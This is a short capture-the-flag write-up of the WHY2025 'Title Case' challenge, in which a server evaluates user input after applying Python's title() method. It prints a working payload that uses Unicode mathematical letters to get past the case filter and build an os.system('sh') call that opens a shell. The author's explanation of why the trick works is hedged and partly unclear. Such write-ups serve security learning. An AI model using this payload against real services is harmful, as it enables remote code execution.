# Writeup: Title Case (WHY2025 CTF)

**Event:** [WHY2025 CTF](https://ctf.why2025.org/) ([CTFTime](https://ctftime.org/event/2680))
**Challenge:** Title Case
**Category:** Misc
**Solved by:** [dopri](https://github.com/DoPri/)

We are provided with a minimal Python challenge `TitleCase.py`.

## Initial Analysis

The challenge source code is extremely short:

```python
#!/usr/bin/env python3

eval(input().title())
```

The server accepts user input, applies the `.title()` string method, and then executes the result using `eval()`.

The `.title()` method capitalizes the first character of every word and converts the rest to lowercase. This acts as a filter because standard Python built-ins and keywords are case-sensitive.

- `print("test")` -> `Print("Test")` (NameError: name 'Print' is not defined)
- `__import__('os')` -> `__Import__('Os')` (NameError)

## Solution

To bypass this restriction, I needed to find a payload that remains valid Python code (or specifically, valid identifiers for `eval`) after passing through `.title()`.

The solution, as I demonstrated in `exploit.py`, utilizes Unicode characters from the "Mathematical Alphanumeric Symbols" block (specifically, mathematical script or bold characters).

The payload used is:

```python
"𝑒𝓋𝒶𝓁(𝒸𝒽𝓇(95)+𝒸𝒽𝓇(95)+𝒸𝒽𝓇(105)+𝒸𝒽𝓇(109)+𝒸𝒽𝓇(112)+𝒸𝒽𝓇(111)+𝒸𝒽𝓇(114)+𝒸𝒽𝓇(116)+𝒸𝒽𝓇(95)+𝒸𝒽𝓇(95)+𝒸𝒽𝓇(40)+𝒸𝒽𝓇(39)+𝒸𝒽𝓇(111)+𝒸𝒽𝓇(115)+𝒸𝒽𝓇(39)+𝒸𝒽𝓇(41)+𝒸𝒽𝓇(46)+𝒸𝒽𝓇(115)+𝒸𝒽𝓇(121)+𝒸𝒽𝓇(115)+𝒸𝒽𝓇(116)+𝒸𝒽𝓇(101)+𝒸𝒽𝓇(109)+𝒸𝒽𝓇(40)+𝒸𝒽𝓇(39)+𝒸𝒽𝓇(115)+𝒸𝒽𝓇(104)+𝒸𝒽𝓇(39)+𝒸𝒽𝓇(41))"
```

This string corresponds to `eval(chr(95)+...)`, which constructs the string `__import__('os').system('sh')` at runtime.

The key property exploited here is that these specific Unicode characters (like `𝑒` / U+1D452) are normalized by Python's parser to their ASCII equivalents (`e`) _after_ or effectively bypassing the `.title()` transformation in a way that preserves their validity as identifiers, or they simply do not have a "Title Case" mapping that disrupts the payload structure.

By sending this payload, I achieved arbitrary code execution (RCE) and could read the flag.
